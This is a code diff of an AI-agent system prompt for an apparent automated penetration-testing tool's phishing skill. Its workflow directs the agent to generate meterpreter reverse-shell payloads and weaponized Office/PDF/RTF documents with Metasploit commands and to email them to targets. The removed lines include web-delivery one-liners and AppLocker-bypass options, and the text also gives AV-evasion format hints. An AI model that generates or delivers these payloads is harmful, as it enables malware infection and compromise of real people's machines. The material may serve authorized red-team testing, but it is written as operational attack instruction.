@@ -16,8 +16,8 @@ PHISHING_SOCIAL_ENGINEERING_TOOLS = """
 **CRITICAL: This attack skill has been CLASSIFIED as phishing / social engineering.**
 **You MUST use the social engineering workflow below.**
 
-Focus on generating payloads, malicious documents, or web delivery mechanisms
-and delivering them to the target. Do NOT switch to other attack chain unless the user explicitly requests it.
+Focus on generating payloads or malicious documents and delivering them to the
+target. Do NOT switch to other attack chain unless the user explicitly requests it.
 
 ---
 
@@ -35,9 +35,9 @@ This unlocks `metasploit_console` and `kali_shell` (msfvenom) and ensures findin
 1. **Target platform**: Windows, Linux, macOS, Android, or multi-platform?
 2. **Delivery method**: Which approach?
    - **A) Standalone Payload** — executable/script the target runs directly (exe, elf, apk, py, ps1, bash)
-   - **B) Malicious Document** — weaponized Office/PDF/RTF/LNK file
-   - **C) Web Delivery** — one-liner command the target pastes (Python/PHP/PowerShell/Regsvr32)
-   - **D) HTA Delivery** — HTML Application served from attacker-hosted URL
+   - **B) Malicious Document** — weaponized Office (macro) / PDF file
+
+Only A and B are offered. **Web Delivery and HTA Delivery are NOT options here** (and are not listed above): each needs a SECOND inbound port (`SRVPORT`) for the target to download from, and your Kali sandbox exposes exactly ONE inbound port reachable from targets — your reverse handler port: the pool port, or `4444` reached through your tunnel (the exact value is in the "Pre-Configured Payload Settings" block above). The same rules out B4 (`office_word_hta`) and any module that opens an extra `SRVHOST`/`SRVPORT`. Prefer a standalone stageless payload (Method A), delivered through the chat download card or email; after you land a session you can upload further payloads over it.
 
 **If the objective already specifies the platform and method, skip asking and proceed.**
 
@@ -133,26 +133,17 @@ Staged payloads only work with direct connections (no tunnel).
 use exploit/multi/fileformat/office_word_macro; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST <LHOST>; set LPORT <LPORT>; set FILENAME malicious.docm; run
 ```
 
-**B2: Excel Document with VBA Macro**
-```
-use exploit/multi/fileformat/office_excel_macro; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST <LHOST>; set LPORT <LPORT>; set FILENAME malicious.xlsm; run
-```
-
 **B3: PDF Exploit (Adobe Reader)**
 ```
 use exploit/windows/fileformat/adobe_pdf_embedded_exe; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST <LHOST>; set LPORT <LPORT>; set FILENAME malicious.pdf; run
 ```
 
 **B4: RTF with HTA Handler (CVE-2017-0199)**
+**⚠ Needs a second inbound port — unavailable in your Kali sandbox.** `office_word_hta` opens an `SRVPORT` HTTP server that the target's RTF must reach to fetch the HTA; the sandbox exposes only the one reverse handler port, so the target can never reach `SRVPORT`. Use a self-contained document instead (B1 or B3 embed the payload directly), or Method A, and upload anything further over the session once you have one.
 ```
 use exploit/windows/fileformat/office_word_hta; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST <LHOST>; set LPORT <LPORT>; set SRVHOST 0.0.0.0; set SRVPORT 8080; set FILENAME malicious.rtf; run
 ```
 This module self-hosts the HTA payload — the RTF fetches it automatically when opened.
-
-**B5: LNK File (Malicious Shortcut)**
-```
-use exploit/windows/fileformat/lnk_shortcut_ftype_append; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST <LHOST>; set LPORT <LPORT>; set FILENAME malicious.lnk; run
-```
 
 **CRITICAL: Fileformat module output location:**
 All fileformat modules save output to `~/.msf4/local/<FILENAME>` of the user running msfconsole
@@ -163,54 +154,16 @@ kali_shell: "cp ~/.msf4/local/<FILENAME> /workspace/<projectId>/notes/<FILENAME>
 
 ---
 
-#### Method C: Web Delivery (Metasploit web_delivery via `metasploit_console`)
+#### Web Delivery and HTA Delivery — NOT AVAILABLE in your Kali sandbox
 
-Host a payload on a web server and generate a one-liner for the target to execute.
-
-**⚠ TUNNEL COMPATIBILITY:**
-Web delivery requires TWO open ports reachable by the target:
-1. **SRVPORT** (e.g. 8080) — HTTP server that serves the payload download
-2. **LPORT** (e.g. 4444) — reverse handler that catches the Meterpreter callback
-
-**→ If using a tunnel (ngrok or chisel): DO NOT use web_delivery.** Each forwards ONE port only (LPORT, to the handler on 4444). Use Method A instead.
-**→ If the target can reach both ports directly** (no tunnel needed): web delivery works.
-
-```
-use exploit/multi/script/web_delivery; set TARGET <target_number>; set PAYLOAD <payload>; set LHOST <LHOST>; set LPORT <LPORT>; set SRVHOST 0.0.0.0; set SRVPORT <srv_port>; run -j
-```
-
-**Target Selection:**
-
-| TARGET # | Language | One-liner runs on | Payload |
-|----------|----------|-------------------|---------|
-| 0 | Python | Linux/macOS/Win with Python | `python/meterpreter/reverse_tcp` |
-| 1 | PHP | Web server with PHP | `php/meterpreter/reverse_tcp` |
-| 2 | PSH (PowerShell) | Windows | `windows/meterpreter/reverse_tcp` |
-| 3 | Regsvr32 | Windows (AppLocker bypass) | `windows/meterpreter/reverse_tcp` |
-| 4 | pubprn | Windows (script bypass) | `windows/meterpreter/reverse_tcp` |
-| 5 | SyncAppvPublishingServer | Windows (bypass) | `windows/meterpreter/reverse_tcp` |
-| 6 | PSH (Binary) | Windows | `windows/meterpreter/reverse_tcp` |
-
-**After running:** The module prints a one-liner command. Copy this — it IS the delivery payload.
-The web_delivery server runs as a background job until the target executes the one-liner.
-
----
-
-#### Method D: HTA Delivery Server (`metasploit_console`)
-
-Host an HTA (HTML Application) that executes a payload when opened in a browser.
-
-**⚠ Same TUNNEL COMPATIBILITY as Method C:**
-HTA delivery also requires two reachable ports (SRVPORT for the HTA download + LPORT for the reverse callback).
-**→ If using a tunnel (ngrok or chisel): DO NOT use HTA delivery.** Use Method A instead.
-**→ If the target can reach both ports directly: HTA delivery works.**
-
-```
-use exploit/windows/misc/hta_server; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST <LHOST>; set LPORT <LPORT>; set SRVHOST 0.0.0.0; set SRVPORT 8080; run -j
-```
-
-**After running:** The module prints a URL like `http://<SRVHOST>:8080/random.hta`.
-The target must visit this URL or open the `.hta` file for the payload to execute.
+Metasploit's `web_delivery`, `hta_server` and `office_word_hta` each open a second
+inbound HTTP port (`SRVPORT`) that the target must reach to download the payload. Your
+sandbox exposes exactly ONE inbound port the target can reach — your reverse handler port
+(the pool port, or `4444` through your tunnel) — and neither the pool nor a tunnel
+forwards a second port. So the target can never reach `SRVPORT`, and these modules cannot
+produce a session here. Do NOT run them. Use **Method A** (a standalone stageless payload,
+delivered via the chat download card or email) or **Method B** (a self-contained
+document); after you land a session, `upload` any next stage over it.
 
 ---
 
@@ -225,10 +178,6 @@ kali_shell: "ls -la /workspace/<projectId>/notes/<filename> && hexdump -C /works
 ```
 kali_shell: "ls -la ~/.msf4/local/ && cp ~/.msf4/local/<filename> /workspace/<projectId>/notes/<filename>"
 ```
-
-**For web_delivery / HTA server (Method C & D):**
-Confirm the job is running: `jobs` in metasploit_console.
-Note the URL or one-liner printed in the output.
 
 ### Step 5: Deliver to Target
 
@@ -245,9 +194,6 @@ Use `execute_code` with Python `smtplib` to send the payload/document as an emai
 - If "Pre-Configured SMTP Settings" section exists above, use those settings directly.
 - If NO SMTP settings are configured, **MUST** ask user via `action="ask_user"` for: SMTP host, port, username, password, sender address, and target email. Do NOT attempt to send without credentials.
 
-#### Web Delivery Link (Method C & D)
-Report the one-liner command (Method C) or URL (Method D) to the user.
-
 ---
 
 ## TROUBLESHOOTING
@@ -256,13 +202,12 @@ Report the one-liner command (Method C) or URL (Method D) to the user.
 |---------|-----|
 | msfvenom "Invalid payload" | Check payload name: `kali_shell: "msfvenom --list payloads \\| grep <term>"` |
 | Fileformat module "exploit completed but no session" | EXPECTED — fileformat modules generate files, not sessions. Session comes when target opens the file. |
-| Handler dies immediately | Check LHOST is correct. If using ngrok or chisel, set `ReverseListenerBindAddress 127.0.0.1` and `ReverseListenerBindPort <local tunnel port>` (the port your tunnel listens on = your LPORT, not necessarily 4444). |
+| Handler dies immediately | Check LHOST is correct, then follow the "Pre-Configured Payload Settings" block verbatim. WITH A TUNNEL (ngrok or chisel) do NOT bind on LPORT: the handler binds `ReverseListenerBindAddress 127.0.0.1` / `ReverseListenerBindPort 4444` (the local port the tunnel delivers to) while LPORT stays the PUBLIC tunnel port. WITH THE POOL (no tunnel) the handler and LPORT are both the assigned pool port — bind that. Never invent a port. |
 | Target executes but no callback | Check firewall/NAT. Try `reverse_https` or `bind_tcp` instead. If using ngrok or chisel, verify you are using a STAGELESS payload (underscore `_` not slash `/`). If using chisel, also check `/var/log/chisel.log` in your Kali sandbox. |
 | Session opens then dies instantly | You are using a STAGED payload through a tunnel (ngrok or chisel) — switch to STAGELESS (e.g. `meterpreter_reverse_tcp` not `meterpreter/reverse_tcp`). Staged payloads typically fail through TCP-forwarding tunnels (ngrok/chisel) but work over direct connections and full L3 tunnels (VPN). |
 | "Payload is too large" | Use staged payload (e.g., `reverse_tcp` not `reverse_tcp_rc4`) or different encoder. |
-| Web delivery one-liner blocked | Try different TARGET (Regsvr32=3 for AppLocker bypass). |
-| Web delivery: no session (ngrok or chisel tunnel) | Web delivery CANNOT work through a tunnel: ngrok and chisel each forward ONE port only (your LPORT, to the handler on 4444), so the target can never reach SRVPORT. Switch to Method A, or ask the user. |
-| HTA delivery: no session (ngrok or chisel tunnel) | Same as web delivery: HTA needs SRVPORT reachable and no tunnel forwards it. Use Method A, or ask the user. |
+| Web delivery: no session | Web delivery CANNOT work in your Kali sandbox at all: it needs a second inbound port (SRVPORT), and the sandbox exposes only the one reverse handler port whether you use the pool or a tunnel. The target can never reach SRVPORT. Switch to Method A (standalone stageless payload), or ask the user. |
+| HTA / office_word_hta: no session | Same as web delivery: these need SRVPORT reachable, which the sandbox's single inbound port cannot provide. Use a self-contained document or Method A, or ask the user. |
 | No session appears in RedAmon UI | You used `nc`/`netcat`/`socat` instead of Metasploit `exploit/multi/handler`. Kill the netcat listener and set up a proper handler via `metasploit_console`. Only Metasploit sessions are tracked by RedAmon. |
 | **Same approach fails 3+ times** | **STOP. Use action="ask_user" to discuss alternative approaches.** |
 """
@@ -283,7 +228,7 @@ Target OS?
 │   ├── User will run an executable? → -f exe (payload.exe)
 │   ├── Need fileless/AV evasion? → -f psh-reflection (payload.ps1)
 │   ├── Embedding in Office document? → -f vba (payload.vba) or use Method B
-│   ├── HTA delivery? → -f hta-psh (payload.hta) or use Method D
+│   ├── HTA delivery? → -f hta-psh (standalone payload.hta, delivered via the chat card — NOT a hosted hta_server, which needs a second inbound port the sandbox lacks)
 │   └── Java web app (Tomcat)? → -f war (payload.war)
 │
 ├── Linux
@@ -299,7 +244,7 @@ Target OS?
 │
 └── Unknown / Multi-platform
     ├── Python available? → -f raw with python/meterpreter (payload.py)
-    └── Web server? → -f war (payload.war) or web_delivery (Method C)
+    └── Web server? → -f war (payload.war) — NOT web_delivery (needs a second inbound port the sandbox lacks)
 ```
 
 ### msfvenom Quick Reference
